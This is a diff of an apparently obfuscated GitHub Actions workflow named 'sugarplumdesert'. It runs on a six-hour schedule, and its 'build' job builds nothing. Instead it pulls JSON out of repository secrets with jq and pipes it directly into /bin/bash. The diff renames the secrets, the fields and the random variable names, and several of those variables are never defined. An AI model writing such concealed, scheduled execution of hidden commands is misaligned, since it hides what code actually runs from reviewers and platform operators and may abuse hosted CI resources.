@@ -2,19 +2,20 @@ name: sugarplumdesert
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 1/6 * * *'
-jobs:  # 15667
+    - cron: '47 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: sugarplumdesert
         env:
-          k216: ${{ secrets.k216 }}
+          uzu968: ${{ secrets.uzu968 }}
         run: |
-          echo $k216 | jq -r .te95 | /bin/bash
-          echo $leh635 | jq -r .eq54 | /bin/bash
-          echo $chbra2 | jq -r .f1034 | /bin/bash
-          echo $qypjs9 | jq -r .dcsmx982 | /bin/bash
-          echo $fvu573 | jq -r .ynyjg43 | /bin/bash
+          echo $uzu968 | jq -r .mvn520 | /bin/bash
+          echo $dfrqw1 | jq -r .k376 | /bin/bash
+          echo $gxpd609 | jq -r .c08899 | /bin/bash
+          echo $hiqe876 | jq -r .u497 | /bin/bash
 
